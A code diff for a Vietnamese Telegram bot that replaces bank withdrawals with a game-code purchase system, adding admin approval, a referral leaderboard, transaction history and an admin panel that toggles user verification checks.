+            icon = medals.get(idx, E["RIGHT"])
+            msg += f"{icon} <b>Top {idx}:</b> {name_str} — <code>{ref_count:,}</code> bạn bè\n"
+        await message.reply_text(msg, parse_mode="HTML")
 
-# ============================================================
-# HỦY RÚT
-# ============================================================
+    elif text in ["Nhóm Hỗ Trợ", "💬 Nhóm Hỗ Trợ"]:
+        await message.reply_text(
+            f"{E['PHONE']} <b>NHÓM HỖ TRỢ CHÍNH THỨC:</b>\n{E['RIGHT']} {SUPPORT_GROUP}\n\n"
+            f"{E['DEV']} <b>ADMIN:</b> @dgfrutil",
+            parse_mode="HTML",
+        )
 
-async def cancel_withdraw_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    elif text in ["Link Game", "🎮 Link Game"]:
+        await message.reply_text(
+            f"{E['GAME_BELL']} <b>LINK GAME</b> {E['GAME_STAR']}\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"{E['GAME_STARSTRUCK']} Bấm <b>Nhập Code Tại Đây</b> để nhập code vừa mua.\n"
+            f"{E['GAME_CAR']} Bấm <b>Link room tại đây</b> để vào phòng chơi game.\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"{E['GAME_STORM']} Chúc anh em chơi vui vẻ và may mắn! {E['GAME_TONGUE']}",
+            reply_markup=get_game_link_markup(),
+            parse_mode="HTML",
+            disable_web_page_preview=True,
+        )
+
+    elif text in ["Lịch Sử", "Lịch Sử Giao Dịch", "📜 Lịch Sử Giao Dịch"]:
+        txs = await db_query(
+            "SELECT type, amount, status, created_at, details FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 10",
+            (user.id,),
+            fetchall=True,
+        )
+        if not txs:
+            await message.reply_text(
+                f"{E['BANDAGE']} <b>Bạn chưa có giao dịch nào.</b>",
+                parse_mode="HTML",
+            )
+            return
+        msg = f"{E['INBOX']} <b>LỊCH SỬ GIAO DỊCH GẦN ĐÂY</b>\n━━━━━━━━━━━━━━━━━━\n\n"
+        for tx_type, amount, status, created_at, details in txs:
+            icon = E["LIKE"] if status == "Thành công" else E["CROSS"]
+            msg += (
+                f"{icon} <b>{tx_type}</b>: <code>{amount:,}đ</code>\n"
+                f"{E['SHIELD']} Chi tiết: <code>{details or 'Không có'}</code>\n"
+                f"{E['HOURGLASS']} Thời gian: <code>{created_at}</code>\n"
+                "----------------------------------\n"
+            )
+        await message.reply_text(msg, parse_mode="HTML")
+
+    elif text in ["Rút Code", "💳 Rút Code", "Rút Tiền", "💳 Rút Tiền"]:
+        if (
+            not await get_verify_setting("allow_withdraw")
+            and user.id not in ADMIN_IDS
+        ):
+            await message.reply_text(
+                f"{E['CROSS']} <b>Tính năng rút tiền hiện đang TẮT bởi Quản trị viên!</b>",
+                parse_mode="HTML",
+            )
+            return
+        if db_user[4] == 1:
+            await message.reply_text(
+                f"{E['CROSS']} <b>Tài khoản của bạn đã bị CẤM RÚT CODE!</b>",
+                parse_mode="HTML",
+            )
+            return
+        buttons = [[InlineKeyboardButton(
+            f"XÁC NHẬN MUA CODE (Giá {CODE_PRICE:,}đ)",
+            callback_data=f"buycode_confirm_{CODE_PRICE}",
+            api_kwargs={"icon_custom_emoji_id": "6206196801775605920"},
+        )]]
+        await message.reply_text(
+            f"{E['SHIELD']} <b>HỆ THỐNG RÚT CODE TỰ ĐỘNG</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"{E['MONEY']} <b>Số dư hiện tại:</b> <code>{db_user[1]:,}đ</code>\n\n"
+            f"{E['LOVE_FACE']} Nhấn nút bên dưới để xác nhận mua code giá <b>{CODE_PRICE:,}đ</b>:",
+            reply_markup=InlineKeyboardMarkup(buttons),
+            parse_mode="HTML",
+        )
+
+
+async def edit_admin_msg(query, extra_html: str):
+    msg = query.message
+    try:
+        if msg.text:
+            await query.edit_message_text(
+                f"{msg.text_html}\n\n{extra_html}",
+                parse_mode="HTML",
+                reply_markup=None,
+            )
+        else:
+            await query.edit_message_caption(
+                caption=f"{msg.caption_html or ''}\n\n{extra_html}",
+                parse_mode="HTML",
+                reply_markup=None,
+            )
+    except Exception as exc:
+        logger.warning("Không sửa được tin nhắn admin: %s", exc)
+
+
+async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     if not query:
         return
     user = query.from_user
-    user_withdraw_state.pop(user.id, None)
-    try:
-        await query.answer("Đã hủy thao tác!")
-        await query.delete_message()
-    except Exception:
-        pass
-    await context.bot.send_message(chat_id=user.id, text=f"{E['BAN']} <b>Đã hủy thao tác rút tiền.</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
+    data = query.data or ""
 
-# ============================================================
-# LIÊN KẾT NGÂN HÀNG
-# ============================================================
-
-async def link_bank_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if await handle_anti_spam(update, context) or not await require_private_user(update):
-        return
-    user = update.effective_user
-    if await is_maintenance() and user.id not in ADMIN_IDS:
-        await update.message.reply_text(f"{E['STOP']} Hệ thống đang bảo trì, vui lòng quay lại sau!")
-        return
-    if not context.args or len(context.args) < 3:
-        await update.message.reply_text(f"{E['BAN']} <b>Sai cú pháp liên kết!</b>\n{E['ARROW_DOWN']} Ví dụ đúng:\n<code>/lk 1068030300 VCB NGUYEN CA NGU</code>", parse_mode="HTML")
-        return
-    bank_str = " ".join(context.args).strip()
-    if len(bank_str) > 300:
-        await update.message.reply_text("❌ Thông tin ngân hàng quá dài.")
-        return
-    await db_query("UPDATE users SET bank_info=%s WHERE user_id=%s", (bank_str, user.id), commit=True)
-    await update.message.reply_text(f"{E['THUMB']} <b>LIÊN KẾT THÀNH CÔNG!</b>\n{E['LOCK']} Thông tin lưu trữ: <code>{bank_str}</code>", parse_mode="HTML", reply_markup=get_main_keyboard())
-
-# ============================================================
-# RESET BANK - ADMIN
-# ============================================================
-
-async def reset_bank_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update):
-        return
-    message = update.effective_message
-    if not message:
-        return
-    args = context.args or []
-    if len(args) < 1:
-        await message.reply_text(f"{E['BAN']} <b>Sai cú pháp!</b>\nCú pháp: <code>/resetbank USER_ID</code>", parse_mode="HTML")
-        return
-    try:
-        target_id = int(args[0])
-    except (ValueError, TypeError):
-        await message.reply_text("❌ USER_ID không hợp lệ.")
-        return
-    user_exists = await db_query("SELECT user_id, bank_info FROM users WHERE user_id=%s", (target_id,), fetchone=True)
-    if not user_exists:
-        await message.reply_text(f"❌ Không tìm thấy user <code>{target_id}</code>.", parse_mode="HTML")
-        return
-    old_bank = user_exists[1]
-    await db_query("UPDATE users SET bank_info=NULL WHERE user_id=%s", (target_id,), commit=True)
-    user_withdraw_state.pop(target_id, None)
-    await message.reply_text(f"{E['THUMB']} <b>ĐÃ RESET NGÂN HÀNG CỦA USER:</b> <code>{target_id}</code>\n{E['LOCK']} Bank cũ: <code>{old_bank or 'Chưa liên kết'}</code>", parse_mode="HTML")
-    try:
-        await context.bot.send_message(
-            chat_id=target_id,
-            text=f"{E['ALERT1']} <b>Thông tin ngân hàng của bạn đã được Admin reset.</b>\n{E['ARROW_DOWN']} Vui lòng dùng <code>/lk STK NGAN_HANG TEN_CHU_TAI_KHOAN</code> để cài đặt lại.",
-            parse_mode="HTML",
+    is_admin_action = data.startswith(("approve_code_", "reject_code_"))
+    if is_admin_action and user.id not in ADMIN_IDS:
+        await query.answer(
+            "Bạn không có quyền thực hiện thao tác này!", show_alert=True
         )
-    except Exception as exc:
-        logger.warning("Không gửi được thông báo reset bank cho user %s: %s", target_id, exc)
-
-# ============================================================
-# RÚT TIỀN
-# ============================================================
-
-async def handle_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    user = update.effective_user
-    message = update.effective_message
-    if not user or not message or update.effective_chat.type != "private" or user_withdraw_state.get(user.id) != "WAITING_AMOUNT":
-        return False
-
-    if not await get_setting("enable_withdraw", "1"):
-        user_withdraw_state.pop(user.id, None)
-        await message.reply_text(f"{E['STOP']} <b>Chức năng rút tiền hiện đã bị khóa bởi Admin.</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
-        return True
-
-    raw_text = (message.text or "").strip()
-    text = raw_text.replace(",", "").replace(".", "")
-    if text.lower() in ["hủy", "huy", "cancel", "❌ hủy", "❌ hủy rút tiền"]:
-        user_withdraw_state.pop(user.id, None)
-        await message.reply_text(f"{E['BAN']} <b>Đã hủy thao tác rút tiền.</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
-        return True
-    if not text.isdigit():
-        await message.reply_text(f"{E['BAN']} <b>Số tiền phải là số nguyên hợp lệ!</b>\nVui lòng nhập lại (hoặc nhập <b>hủy</b> để thoát):", parse_mode="HTML")
-        return True
-    amount = int(text)
-    if amount <= 0:
-        await message.reply_text("❌ Số tiền không hợp lệ.")
-        return True
-    db_user = await db_query("SELECT balance, bank_info, is_banned, is_withdraw_banned FROM users WHERE user_id=%s", (user.id,), fetchone=True)
-    if not db_user:
-        user_withdraw_state.pop(user.id, None)
-        await message.reply_text("❌ Không tìm thấy tài khoản. Vui lòng /start lại.")
-        return True
-    balance, bank_info, is_banned, is_withdraw_banned = db_user
-    if is_banned:
-        user_withdraw_state.pop(user.id, None)
-        await message.reply_text("🚫 Tài khoản của bạn đã bị cấm.")
-        return True
-    if is_withdraw_banned:
-        user_withdraw_state.pop(user.id, None)
-        await message.reply_text("🚫 Bạn đã bị cấm rút tiền.")
-        return True
-    if not bank_info:
-        user_withdraw_state.pop(user.id, None)
-        await message.reply_text("⚠ Chưa liên kết ngân hàng. Dùng /lk trước.")
-        return True
-    if amount < MIN_WITHDRAW or amount > MAX_WITHDRAW:
-        await message.reply_text(f"{E['BAN']} Số tiền rút phải từ <b>{MIN_WITHDRAW:,}đ</b> đến <b>{MAX_WITHDRAW:,}đ</b>!", parse_mode="HTML")
-        return True
-    try:
-        def create_withdraw(cursor):
-            cursor.execute("UPDATE users SET balance = balance - %s WHERE user_id=%s AND balance >= %s AND is_banned=0 AND is_withdraw_banned=0", (amount, user.id, amount))
-            if cursor.rowcount != 1:
-                return None
-            cursor.execute("INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s) RETURNING id", (user.id, "Rút Tiền", amount, "Chờ duyệt", get_now_str(), bank_info))
-            return cursor.fetchone()[0]
-        tx_id = await db_transaction(create_withdraw)
-    except Exception as exc:
-        logger.exception("Lỗi tạo lệnh rút: %s", exc)
-        await message.reply_text("❌ Có lỗi xảy ra. Vui lòng thử lại sau.")
-        return True
-    if not tx_id:
-        await message.reply_text("❌ Số dư không đủ hoặc tài khoản đang bị hạn chế.")
-        return True
-    user_withdraw_state.pop(user.id, None)
-    await message.reply_text(f"{E['CALENDAR']} <b>YÊU CẦU RÚT TIỀN ĐÃ ĐƯỢC GỬI!</b>\n{E['GEAR']} Vui lòng chờ Admin kiểm tra và duyệt tiền.", reply_markup=get_main_keyboard(), parse_mode="HTML")
-    admin_buttons = [[InlineKeyboardButton("✅ DUYỆT", callback_data=f"approve_{tx_id}"), InlineKeyboardButton("❌ TỪ CHỐI", callback_data=f"reject_{tx_id}")]]
-    username_str = f"@{user.username}" if user.username else str(user.id)
-    admin_msg = (
-        f"{E['ALERT1']} <b>LỆNH RÚT TIỀN MỚI (# {tx_id})</b>\n━━━━━━━━━━━━━━━━━━\n"
-        f"{E['EYES']} <b>Khách hàng:</b> {username_str} (<code>{user.id}</code>)\n"
-        f"{E['UP']} <b>Số tiền rút:</b> <code>{amount:,}đ</code>\n"
-        f"{E['LOCK']} <b>Ngân hàng:</b> <code>{bank_info}</code>\n"
-        f"{E['MAIL']} <b>Nội dung chuyển:</b> <code>lixi trung thu</code>\n"
-        f"{E['CALENDAR']} <b>Thời gian:</b> <code>{get_now_str()}</code>"
-    )
-
-    qr_url = generate_vietqr_url(bank_info, amount, memo="lixi trung thu")
-    msg_refs = context.bot_data.setdefault(f"tx_msgs_{tx_id}", [])
-
-    for admin_id in ADMIN_IDS:
-        try:
-            if qr_url:
-                sent_msg = await context.bot.send_photo(chat_id=admin_id, photo=qr_url, caption=admin_msg, reply_markup=InlineKeyboardMarkup(admin_buttons), parse_mode="HTML")
-            else:
-                sent_msg = await context.bot.send_message(chat_id=admin_id, text=admin_msg, reply_markup=InlineKeyboardMarkup(admin_buttons), parse_mode="HTML")
-            msg_refs.append({"chat_id": admin_id, "message_id": sent_msg.message_id, "base_text": admin_msg, "has_photo": bool(qr_url)})
-        except Exception as exc:
-            logger.exception("Không gửi được yêu cầu rút cho admin %s: %s", admin_id, exc)
-    return True
-
-# ============================================================
-# DUYỆT / TỪ CHỐI LỆNH RÚT
-# ============================================================
-
-async def admin_withdraw_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query:
-        return
-    admin_user = query.from_user
-    if admin_user.id not in ADMIN_IDS:
-        try: await query.answer("❌ Quyền truy cập bị từ chối.", show_alert=True)
-        except Exception: pass
-        return
-    try: await query.answer()
-    except Exception: pass
-    data = query.data or ""
-    try:
-        action, tx_id_str = data.split("_", 1)
-        tx_id = int(tx_id_str)
-    except (ValueError, TypeError):
-        return
-    tx = await db_query("SELECT user_id, amount, status, details FROM transactions WHERE id=%s AND type='Rút Tiền'", (tx_id,), fetchone=True)
-    if not tx:
-        try: await query.edit_message_text("❌ Không tìm thấy giao dịch này.")
-        except Exception: pass
-        return
-    user_id, amount, status, bank_info = tx
-    admin_name_str = f"@{admin_user.username}" if admin_user.username else f"<code>{admin_user.id}</code>"
-    if status != "Chờ duyệt":
-        try: await query.answer("⚠ Giao dịch này đã được xử lý trước đó!", show_alert=True)
-        except Exception: pass
-        return
-
-    async def update_admin_message(ref, new_text):
-        try:
-            if ref.get("has_photo"):
-                await context.bot.edit_message_caption(chat_id=ref["chat_id"], message_id=ref["message_id"], caption=new_text, parse_mode="HTML")
-            else:
-                await context.bot.edit_message_text(chat_id=ref["chat_id"], message_id=ref["message_id"], text=new_text, parse_mode="HTML")
-        except Exception: pass
-
-    if action == "approve":
-        try:
-            def approve(cursor):
-                cursor.execute("UPDATE transactions SET status='Thành công' WHERE id=%s AND status='Chờ duyệt'", (tx_id,))
-                return cursor.rowcount == 1
-            changed = await db_transaction(approve)
-        except Exception as exc:
-            logger.exception("Lỗi duyệt: %s", exc)
-            return
-        if changed:
-            try: await context.bot.send_message(chat_id=user_id, text=f"{E['LOVE']} <b>RÚT TIỀN THÀNH CÔNG!</b>\nAdmin đã duyệt yêu cầu rút <b>{amount:,}đ</b> của bạn.", parse_mode="HTML")
-            except Exception: pass
-            refs = context.bot_data.pop(f"tx_msgs_{tx_id}", [])
-            for ref in refs:
-                update_text = f"{ref['base_text']}\n\n{E['THUMB']} <b>TRẠNG THÁI: ĐÃ DUYỆT RÚT TIỀN</b> (Bởi Admin {admin_name_str})"
-                await update_admin_message(ref, update_text)
-
-    elif action == "reject":
-        try:
-            def reject(cursor):
-                cursor.execute("UPDATE transactions SET status='Từ chối' WHERE id=%s AND status='Chờ duyệt'", (tx_id,))
-                if cursor.rowcount != 1:
-                    return False
-                cursor.execute("UPDATE users SET balance = balance + %s WHERE user_id=%s", (amount, user_id))
-                return True
-            changed = await db_transaction(reject)
-        except Exception as exc:
-            logger.exception("Lỗi từ chối: %s", exc)
-            return
-        if changed:
-            try: await context.bot.send_message(chat_id=user_id, text=f"{E['BAN']} <b>YÊU CẦU RÚT TIỀN BỊ TỪ CHỐI</b>\n\nSố tiền <b>{amount:,}đ</b> đã được hoàn trả lại số dư.", parse_mode="HTML")
-            except Exception: pass
-            refs = context.bot_data.pop(f"tx_msgs_{tx_id}", [])
-            for ref in refs:
-                update_text = f"{ref['base_text']}\n\n{E['BAN']} <b>TRẠNG THÁI: ĐÃ TỪ CHỐI</b> (Bởi Admin {admin_name_str})"
-                await update_admin_message(ref, update_text)
-
-# ============================================================
-# ADMIN USER INFO & CHECK HIST CALLBACKS
-# ============================================================
-
-async def admin_userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query:
-        return
-    if query.from_user.id not in ADMIN_IDS:
-        try: await query.answer("❌ Quyền truy cập bị từ chối.", show_alert=True)
-        except Exception: pass
-        return
-    try: await query.answer()
-    except Exception: pass
-    data = query.data or ""
-    try:
-        target_id = int(data.split("_")[1])
-    except (IndexError, ValueError):
-        return
-    u = await db_query(USER_SELECT_QUERY, (target_id,), fetchone=True)
-    if not u:
-        try: await query.answer("❌ Không tìm thấy thông tin user này.", show_alert=True)
-        except Exception: pass
-        return
-    res = await db_query("SELECT COUNT(*) FROM users WHERE referrer_id=%s AND ref_rewarded=1", (target_id,), fetchone=True)
-    invited_count = res[0] if res else 0
-    username = f"@{u[1]}" if u[1] else "Chưa đặt"
-    bank = u[3] if u[3] else "Chưa liên kết"
-    referrer = u[4] if u[4] is not None else "Không có"
-    msg = (
-        f"{E['EYES']} <b>THÔNG TIN CHI TIẾT USER</b>\n━━━━━━━━━━━━━━━━━━\n"
-        f"{E['EYES']} ID: <code>{u[0]}</code>\n"
-        f"{E['COOL']} Username: {username}\n"
-        f"{E['PHONE']} SĐT: <code>{u[5] or 'Chưa xác minh'}</code>\n"
-        f"{E['UP']} Số dư: <code>{u[2]:,}đ</code>\n"
-        f"{E['LOCK']} Ngân hàng: <code>{bank}</code>\n"
-        f"{E['CLIP']} Khách giới thiệu: <code>{referrer}</code>\n"
-        f"{E['COOL']} Tổng đã mời hợp lệ: <code>{invited_count}</code> người\n"
-        f"{E['BAN']} Khóa TK: <b>{'CÓ' if u[10] else 'KHÔNG'}</b>\n"
-        f"{E['STOP']} Cấm rút: <b>{'CÓ' if u[11] else 'KHÔNG'}</b>\n"
-        f"{E['CALENDAR']} Tham gia: <code>{u[12]}</code>"
-    )
-    await context.bot.send_message(chat_id=query.from_user.id, text=msg, parse_mode="HTML")
-
-async def check_history_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query:
-        return
-    if query.from_user.id not in ADMIN_IDS:
-        try:
-            await query.answer("❌ Quyền truy cập bị từ chối.", show_alert=True)
-        except Exception:
-            pass
         return
     try:
         await query.answer()
     except Exception:
         pass
 
+    if data.startswith("approve_code_"):
+        try:
+            target_user_id = int(data.replace("approve_code_", ""))
+        except ValueError:
+            return
+
+        try:
+            await query.edit_message_reply_markup(reply_markup=None)
+        except Exception:
+            pass
+
+        def process_admin_approve(cursor):
+            cursor.execute(
+                "SELECT balance FROM users WHERE user_id=%s FOR UPDATE",
+                (target_user_id,),
+            )
+            u_row = cursor.fetchone()
+            if not u_row or u_row[0] < CODE_PRICE:
+                return "NOT_ENOUGH_BALANCE"
+            cursor.execute(
+                "SELECT id, code_val FROM code_stock WHERE is_used=0 ORDER BY id ASC LIMIT 1 FOR UPDATE"
+            )
+            stock_item = cursor.fetchone()
+            if not stock_item:
+                return "OUT_OF_STOCK"
+            code_stock_id, code_val = stock_item
+            cursor.execute(
+                "UPDATE users SET balance = balance - %s WHERE user_id=%s",
+                (CODE_PRICE, target_user_id),
+            )
+            cursor.execute(
+                "UPDATE code_stock SET is_used=1 WHERE id=%s", (code_stock_id,)
+            )
+            cursor.execute(
+                "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
+                (
+                    target_user_id,
+                    f"Mua Code {CODE_PRICE}đ",
+                    CODE_PRICE,
+                    "Thành công",
+                    get_now_str(),
+                    f"Code: {code_val}",
+                ),
+            )
+            return code_val
+
+        try:
+            res = await db_transaction(process_admin_approve)
+        except Exception as exc:
+            logger.exception("Lỗi duyệt code: %s", exc)
+            await edit_admin_msg(
+                query, f"{E['CROSS']} <b>Lỗi hệ thống khi duyệt đơn.</b>"
+            )
+            return
+
+        if res == "NOT_ENOUGH_BALANCE":
+            await edit_admin_msg(
+                query,
+                f"{E['CROSS']} <b>Không duyệt được: người dùng không đủ số dư.</b>",
+            )
+            return
+        if res == "OUT_OF_STOCK":
+            await edit_admin_msg(
+                query, f"{E['CROSS']} <b>Kho code đã hết!</b>"
+            )
+            return
+
+        try:
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=build_buy_success_text(res),
+                parse_mode="HTML",
+            )
+        except Exception as exc:
+            logger.warning("Không gửi code cho user %s: %s", target_user_id, exc)
+
+        await edit_admin_msg(
+            query, f"{E['CHECK']} <b>ĐÃ ĐƯỢC ADMIN DUYỆT THÀNH CÔNG!</b>"
+        )
+        return
+
+    if data.startswith("reject_code_"):
+        try:
+            target_user_id = int(data.replace("reject_code_", ""))
+        except ValueError:
+            return
+        try:
+            await query.edit_message_reply_markup(reply_markup=None)
+        except Exception:
+            pass
+        try:
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=f"{E['CROSS']} <b>Đơn mua code của bạn đã bị Admin từ chối!</b>",
+                parse_mode="HTML",
+            )
+        except Exception:
+            pass
+        await edit_admin_msg(
+            query, f"{E['CROSS']} <b>ĐÃ BỊ TỪ CHỐI BỞI ADMIN!</b>"
+        )
+        return
+
+    if (
+        not await get_verify_setting("allow_withdraw")
+        and user.id not in ADMIN_IDS
+    ):
+        await query.edit_message_text(
+            f"{E['CROSS']} <b>Tính năng rút tiền đang bị khóa bởi Hệ thống!</b>",
+            parse_mode="HTML",
+        )
+        return
+    db_user = await db_query(
+        "SELECT balance, is_banned, is_withdraw_banned FROM users WHERE user_id=%s",
+        (user.id,),
+        fetchone=True,
+    )
+    if not db_user or db_user[1] == 1:
+        await query.edit_message_text(
+            f"{E['CROSS']} <b>Tài khoản của bạn đã bị khóa vĩnh viễn!</b>",
+            parse_mode="HTML",
+        )
+        return
+    if db_user[2] == 1:
+        await query.edit_message_text(
+            f"{E['CROSS']} <b>Tài khoản của bạn đã bị cấm rút code!</b>",
+            parse_mode="HTML",
+        )
+        return
+    balance = db_user[0]
+
+    if data.startswith("buycode_confirm"):
+        shown = data.replace("buycode_confirm", "").lstrip("_")
+        if shown.isdigit() and int(shown) != CODE_PRICE:
+            await query.edit_message_text(
+                f"{E['WARN']} <b>GIÁ CODE ĐÃ THAY ĐỔI!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"Giá hiện tại: <b>{CODE_PRICE:,}đ</b>\n"
+                f"Vui lòng bấm lại nút <b>Rút Code</b> để xem giá mới.",
+                parse_mode="HTML",
+            )
+            return
+
+        if balance < CODE_PRICE:
+            await query.edit_message_text(
+                f"{E['CROSS']} <b>SỐ DƯ KHÔNG ĐỦ!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"Bạn cần tối thiểu <b>{CODE_PRICE:,}đ</b> để mua code. Số dư hiện tại: <b>{balance:,}đ</b>",
+                parse_mode="HTML",
+            )
+            return
+
+        is_auto = await get_verify_setting("auto_buy_code")
+        if not is_auto:
+            admin_markup = InlineKeyboardMarkup([[
+                abtn("Duyệt", "MEDAL", callback_data=f"approve_code_{user.id}"),
+                abtn("Từ chối", "CROSS", callback_data=f"reject_code_{user.id}"),
+            ]])
+            for admin_id in ADMIN_IDS:
+                try:
+                    await context.bot.send_message(
+                        chat_id=admin_id,
+                        text=(
+                            f"{E['WARN']} <b>CÓ ĐƠN MUA CODE MỚI CHỜ DUYỆT!</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━\n"
+                            f"{E['TARGET']} <b>User ID:</b> <code>{user.id}</code>\n"
+                            f"{E['RIGHT']} <b>Username:</b> @{user.username or 'Không có'}\n"
+                            f"{E['MONEY']} <b>Số tiền:</b> <code>{CODE_PRICE:,}đ</code>"
+                        ),
+                        reply_markup=admin_markup,
+                        parse_mode="HTML",
+                    )
+                except Exception as exc:
+                    logger.warning(
+                        "Không gửi được đơn cho admin %s: %s", admin_id, exc
+                    )
+            await query.edit_message_text(
+                f"{E['HOURGLASS']} <b>Đơn mua code của bạn đã được gửi đến Admin!</b>\nVui lòng chờ Admin duyệt, hệ thống sẽ trả mã code khi được duyệt.",
+                parse_mode="HTML",
+            )
+            return
+
+        def process_buy_code(cursor):
+            cursor.execute(
+                "SELECT id, code_val FROM code_stock WHERE is_used=0 ORDER BY id ASC LIMIT 1 FOR UPDATE"
+            )
+            stock_item = cursor.fetchone()
+            if not stock_item:
+                return "OUT_OF_STOCK"
+            code_stock_id, code_val = stock_item
+            cursor.execute(
+                "UPDATE users SET balance = balance - %s WHERE user_id=%s AND balance >= %s",
+                (CODE_PRICE, user.id, CODE_PRICE),
+            )
+            if cursor.rowcount != 1:
+                return "NOT_ENOUGH_BALANCE"
+            cursor.execute(
+                "UPDATE code_stock SET is_used=1 WHERE id=%s", (code_stock_id,)
+            )
+            cursor.execute(
+                "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
+                (
+                    user.id,
+                    f"Mua Code {CODE_PRICE}đ",
+                    CODE_PRICE,
+                    "Thành công",
+                    get_now_str(),
+                    f"Code: {code_val}",
+                ),
+            )
+            return code_val
+
+        try:
+            result = await db_transaction(process_buy_code)
+        except Exception as exc:
+            logger.exception("Lỗi khi mua code: %s", exc)
+            await query.edit_message_text(
+                f"{E['CROSS']} Đã xảy ra lỗi trong quá trình xử lý mua code.",
+                parse_mode="HTML",
+            )
+            return
+        if result == "OUT_OF_STOCK":
+            await query.edit_message_text(
+                f"{E['BANDAGE']} <b>RẤT TIẾC, KHO CODE HIỆN ĐÃ HẾT!</b>\nVui lòng liên hệ Admin hoặc quay lại sau.",
+                parse_mode="HTML",
+            )
+        elif result == "NOT_ENOUGH_BALANCE":
+            await query.edit_message_text(
+                f"{E['CROSS']} <b>Số dư không đủ!</b>", parse_mode="HTML"
+            )
+        else:
+            await query.edit_message_text(
+                build_buy_success_text(result), parse_mode="HTML"
+            )
+
+
+async def build_admin_menu():
+    st_phone = await get_verify_setting("verify_phone")
+    st_cccam = await get_verify_setting("verify_cccam")
+    st_miniapp_cap = await get_verify_setting("verify_miniapp_captcha")
+    st_ip = await get_verify_setting("verify_ip")
+    st_channel = await get_verify_setting("verify_channel")
+    st_captcha = await get_verify_setting("verify_captcha")
+    st_withdraw = await get_verify_setting("allow_withdraw")
+    st_auto_buy = await get_verify_setting("auto_buy_code")
+    st_camera = await get_verify_setting("verify_camera")
+
+    def state(v):
+        return "BẬT" if v else "TẮT"
+
+    buttons = [
+        [abtn(
+            f"Xác minh SĐT: {state(st_phone)}",
+            "PHONE",
+            callback_data="toggle_verify_phone",
+        )],
+        [abtn(
+            f"Xác minh CCCAM (Camera từ đầu): {state(st_cccam)}",
+            "IMAGE",
+            callback_data="toggle_verify_cccam",
+        )],
+        [abtn(
+            f"Captcha & Camera MiniApp: {state(st_miniapp_cap or st_camera)}",
+            "SHIELD",
+            callback_data="toggle_verify_miniapp_captcha",
+        )],
+        [abtn(
+            f"Xác minh IP Mini App: {state(st_ip)}",
+            "PC",
+            callback_data="toggle_verify_ip",
+        )],
+        [abtn(
+            f"Check Kênh/Nhóm: {state(st_channel)}",
+            "PIN2",
+            callback_data="toggle_verify_channel",
+        )],
+        [abtn(
+            f"Check CAPTCHA: {state(st_captcha)}",
+            "DICE",
+            callback_data="toggle_verify_captcha",
+        )],
+        [abtn(
+            f"Tính năng Rút Tiền: {state(st_withdraw)}",
+            "CARD",
+            callback_data="toggle_allow_withdraw",
+        )],
+        [abtn(
+            f"Tự động Mua Code: {state(st_auto_buy)}",
+            "BATTERY",
+            callback_data="toggle_auto_buy_code",
+        )],
+        [abtn(
+            "Xác Minh Toàn Bộ Thành Viên",
+            "REFRESH",
+            callback_data="admin_verify_all",
+        )],
+    ]
+    text = (
+        f"{E['GEAR']} <b>BẢNG ĐIỀU KHIỂN QUẢN TRỊ VIÊN</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"<i>Nhấn vào từng nút bấm bên dưới để Bật/Tắt cấu hình xác minh & tính năng tương ứng.\n"
+        f"Khi BẬT \"Xác minh CCCAM\", toàn bộ thành viên sẽ phải làm lại captcha + camera.</i>"
+    )
+    return text, InlineKeyboardMarkup(buttons)
+
+
+async def admin_menu_command(
+    update: Update, context: ContextTypes.DEFAULT_TYPE
+):
+    if not is_admin(update):
+        return
+    text, reply_markup = await build_admin_menu()
+    await update.message.reply_text(
+        text, reply_markup=reply_markup, parse_mode="HTML"
+    )
+
+
+async def admin_toggle_callback(
+    update: Update, context: ContextTypes.DEFAULT_TYPE
+):
+    query = update.callback_query
+    if not query:
+        return
+    if not is_admin(update):
+        try:
+            await query.answer(
+                "Bạn không có quyền thực hiện thao tác này!", show_alert=True
+            )
+        except Exception:
+            pass
+        return
     data = query.data or ""
+
+    if data == "admin_verify_all":
+        await db_query(
+            "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
+            commit=True,
+        )
+        pending_miniapp_captcha.clear()
+        pending_camera_verified.clear()
+        try:
+            await query.answer(
+                "Đã đặt lại xác minh toàn bộ thành công!", show_alert=True
+            )
+        except Exception:
+            pass
+        await query.message.reply_text(
+            f"{E['CHECK2']} <b>ĐÃ ĐẶT LẠI TRẠNG THÁI XÁC MINH TOÀN BỘ THÀNH VIÊN!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"Tất cả người dùng sẽ phải xác minh lại từ đầu khi tương tác với Bot.",
+            parse_mode="HTML",
+        )
+        return
+
+    if data == "toggle_verify_miniapp_captcha":
+        cur_cap = await get_verify_setting("verify_miniapp_captcha")
+        cur_cam = await get_verify_setting("verify_camera")
+        new_val = not (cur_cap or cur_cam)
+        await set_verify_setting("verify_miniapp_captcha", new_val)
+        await set_verify_setting("verify_camera", new_val)
